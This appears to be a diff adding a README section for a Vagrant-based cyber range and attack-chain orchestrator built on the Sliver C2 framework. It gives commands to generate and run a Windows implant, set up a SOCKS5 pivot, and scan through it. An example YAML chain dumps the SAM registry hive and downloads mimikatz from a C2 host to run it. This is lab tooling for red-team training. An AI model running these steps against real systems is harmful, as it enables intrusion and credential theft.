@@ -679,3 +679,146 @@ cd /path/to/standalone
 # Add go.mod at root, add explicit requires for grpc/gorm/yaml/protobuf, then:
 go mod tidy
 ```
+## Vagrant Multi-Hop Cyber Range & Orchestrator
+
+This infrastructure provides an automated setup for building and executing multi-stage attack chains within a Vagrant-provisioned environment. It is designed to coordinate complex offensive workflows, focusing on Windows 10 Exploitation and Multi-hop Network Pivoting.
+
+All commands in this README are run from the **repo root** (`sliver-orchestrator/`).
+
+## Deployment Guide
+
+### Prerequisites
+
+Ensure the following tools are installed:
+
+- Vagrant (v2.4.1+) & VirtualBox (v7.0+)
+- Go (v1.22+) for building the orchestrator
+
+### Prepare Workspace & Build
+
+```bash
+# Initialize submodules and pull atomics
+git submodule update --init --remote
+
+# Build the system components
+make scenario-runner
+make scenario-server
+```
+
+### Deploy the Lab (Vagrant)
+
+This setup provisions a dual-homed Linux gateway and an isolated Windows 10 target.
+
+```bash
+# Add the custom Windows box (External link required)
+vagrant box add win10_custom win10_custom.box
+
+# Spin up the lab
+vagrant up win_target
+```
+
+## Lab Architecture & Network Topology
+
+| Host Name | OS | Internal IP | Role |
+|---|---|---|---|
+| `linux_pivot` | Ubuntu 22.04 | 172.16.1.10 | Compromised Gateway |
+| `win_target` | Windows 10 | 192.168.56.10 | Internal Hidden Target |
+
+## Manual Exploitation & Pivoting Playbook
+
+### Start Sliver C2 & Listener
+
+```bash
+./sliver-server
+```
+
+```
+[server] sliver > mtls
+```
+
+### Generate and Run Windows Payload
+
+```bash
+# Generate payload in Sliver
+generate --mtls <C2_IP> --os windows --arch amd64 --save ./win_agent.exe
+
+# Access Windows via Vagrant and run (Shared folder: /vagrant)
+vagrant ssh win_target -c "C:\\vagrant\\win_agent.exe"
+```
+
+### Establish the Pivot (SOCKS5)
+
+```
+[server] sliver > sessions
+[server] sliver > use 1
+[server] sliver (SESSION) > socks5 start --port 1080
+```
+
+```bash
+# Verify connectivity from host
+proxychains nmap -sT -Pn 192.168.56.10
+```
+
+## Orchestrator Configuration & YAML Schema
+
+The orchestrator builds attack chains using a Directed Acyclic Graph (DAG) model.
+
+### Action Types
+
+| Type | Description |
+|---|---|
+| `command` | Raw command execution via shell |
+| `atomic` | Executes a MITRE ATT&CK technique from the Atomics library |
+| `binary` | Uploads and executes a binary (Base64 data or URL) |
+| `sliver_rpc` | Direct Sliver gRPC calls (Screenshot, Netstat, etc.) |
+
+### Example Chain (`lateral-movement-demo.yaml`)
+
+```yaml
+id: lateral-movement-demo
+steps:
+  - id: dump_sam
+    action:
+      type: command
+      command:
+        interpreter: powershell
+        cmd: "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive /y"
+  - id: run_mimikatz
+    depends_on: [dump_sam]
+    action:
+      type: binary
+      binary:
+        url: "http://c2.internal/mimikatz.exe"
+        remote_path: "C:\\Windows\\Temp\\mimi.exe"
+        platform: windows
+```
+
+## REST API Reference (Port 8080)
+
+| Endpoint | Method | Description |
+|---|---|---|
+| `/api/v1/health` | `GET` | Health check |
+| `/api/v1/sessions` | `GET` | List active Sliver sessions |
+| `/api/v1/chains` | `POST` | Create a new attack chain |
+| `/api/v1/chains/{id}/execute` | `POST` | Execute a specific chain |
+
+## Troubleshooting
+
+1. **Win10 Boot:** Wait 2–3 mins for WinRM/SSH initialization.
+2. **Shared Folder:** If `/vagrant` is missing, run:
+   ```bash
+   vagrant plugin install vagrant-vbguest && vagrant reload
+   ```
+3. **Port Collision:** If port 2200 is busy, check terminal logs for the remapped port.
+
+## Building and Moving the Package Out
+
+```bash
+cp -r scenario/ /path/to/standalone/
+cd /path/to/standalone
+go mod tidy
+```
+
+
+
+
